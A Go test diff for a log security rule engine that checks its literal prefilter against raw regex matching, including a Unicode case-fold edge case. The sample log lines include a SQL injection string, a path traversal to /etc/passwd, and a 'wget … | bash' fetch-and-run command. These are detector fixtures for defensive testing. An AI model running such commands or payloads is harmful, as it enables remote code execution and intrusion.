@@ -618,3 +618,61 @@ func TestLoadCustomRulesAndSuppression(t *testing.T) {
 		t.Fatalf("standalone Evaluate wrongly suppressed truncated service display name: %+v", resClipSvcStandalone)
 	}
 }
+
+func TestRuleLiteralPrefilterMatchesRawRE2Soundness(t *testing.T) {
+	pack := DefaultRulePack()
+	pack.Rules = append(pack.Rules,
+		Rule{
+			ID:          "CUSTOM-OPT",
+			Category:    "custom",
+			Severity:    "LOW",
+			Description: "optional quantifier pattern without guaranteed literal",
+			Pattern:     `(?i)(foo)?bar|baz?`,
+			MinCount:    1,
+			Enabled:     true,
+		},
+		Rule{
+			ID:          "CUSTOM-KELVIN",
+			Category:    "custom",
+			Severity:    "LOW",
+			Description: "unicode case fold check",
+			Pattern:     `(?i)kill\s+process`,
+			MinCount:    1,
+			Enabled:     true,
+		},
+	)
+	eng, err := NewEngine(pack)
+	if err != nil {
+		t.Fatalf("NewEngine: %v", err)
+	}
+
+	samples := []string{
+		"GET /healthz 200 1.2ms from 10.0.1.4",
+		"FAILED PASSWORD for root from 198.51.100.1",
+		"GET /api?id=1' UnIoN   SeLeCt 1--",
+		"GET /static/%2E%2e/etc/passwd",
+		"COMMAND=/bin/sh -c WGET http://198.51.100.1/x | BASH",
+		"ba",
+		"bar",
+		"\u212aill process now", // Unicode Kelvin sign U+212A folds to 'k' under (?i)
+	}
+
+	for _, msg := range samples {
+		ev := model.LogEvent{ID: 1, Timestamp: 1, Service: "app", Level: "WARN", Message: msg}
+		eval := eng.MatchEvent(ev, 3.0, 512)
+		got := make(map[string]bool)
+		for _, m := range eval.Matches {
+			got[m.RuleHit.RuleID] = true
+		}
+		for _, cr := range eng.rules {
+			if len(cr.services) > 0 || len(cr.levels) > 0 || cr.rule.MinEntropy > 0 || cr.rule.MinLength > 0 || cr.re == nil {
+				continue
+			}
+			want := cr.re.MatchString(msg)
+			if got[cr.rule.ID] != want {
+				t.Errorf("rule %s prefilter parity mismatch on %q: got=%v want=%v (prefilter=%v)",
+					cr.rule.ID, msg, got[cr.rule.ID], want, cr.anyOfLower)
+			}
+		}
+	}
+}
